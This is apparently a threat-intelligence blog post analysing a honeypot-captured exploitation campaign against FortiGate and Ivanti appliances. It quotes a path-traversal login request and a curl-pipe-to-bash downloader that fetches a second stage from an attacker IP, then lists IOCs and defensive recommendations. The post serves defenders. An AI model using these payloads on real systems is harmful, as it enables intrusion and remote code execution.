---
layout: post
title: "In-the-wild exploitation captured via honeypot network"
date: 2024-07-15
tag: cti
description: "Live payload analysis from an ongoing campaign targeting enterprise infrastructure. IOC extraction and attacker behavior reconstruction."
---

## Context

In July 2024, our global honeypot network detected a coordinated exploitation campaign targeting Fortinet and Ivanti appliances across European enterprise networks. The campaign showed clear signs of human-operated activity rather than opportunistic scanning.

This post details the payload analysis, attacker behavior chain, and extracted IOCs.

## Initial Detection

The first hit arrived on a honeypot simulating a Fortinet FortiGate SSL-VPN interface. Within 90 seconds of the probe, the attacker moved to authenticated exploitation attempts using a known CVE that had a patch available for 47 days.

```
[2024-07-15 02:14:33] POST /remote/login HTTP/1.1
Host: [honeypot-ip]
User-Agent: python-requests/2.28.2
Content-Type: application/x-www-form-urlencoded

username=admin&credential=../../../etc/passwd
```

The User-Agent string (`python-requests`) is consistent with several known initial access broker toolsets observed in previous campaigns.

## Payload Analysis

Once the initial probe succeeded, a staged payload was dropped. Stage 1 was a minimal shell downloader:

```bash
curl -sk http://185.220.x.x/stage2.sh | bash
```

Stage 2 fetched a compiled Go binary (~2.4MB). The binary attempted to establish persistence via cron and performed the following reconnaissance:

- `whoami` and `id`
- Network interface enumeration
- Credential file access attempts (`/etc/shadow`, browser credential stores)
- Active directory enumeration via LDAP queries

> The binary had no public VirusTotal detections at the time of capture. Zero-day detection gap confirmed.

## IOCs

| Type | Value |
|------|-------|
| IP | 185.220.x.x |
| IP | 91.108.x.x |
| Hash (SHA256) | `a3f1d9...` |
| Domain | `update-cdn[.]net` |
| User-Agent | `python-requests/2.28.2` |

## Recommendations

1. **Immediate**: Patch FortiGate appliances to the latest firmware — no exception.
2. **Detection**: Add the IOCs above to your SIEM blocklist and alert rules.
3. **Architecture**: Consider placing SSL-VPN termination behind a WAF with anomaly detection.
4. **Monitoring**: Alert on outbound `curl | bash` patterns from network appliances.

---

*This intelligence was distributed to BOSS CTI subscribers 48 hours before publication. If you want early access to threat intelligence tailored to your exposed assets, [contact us](/contact).*
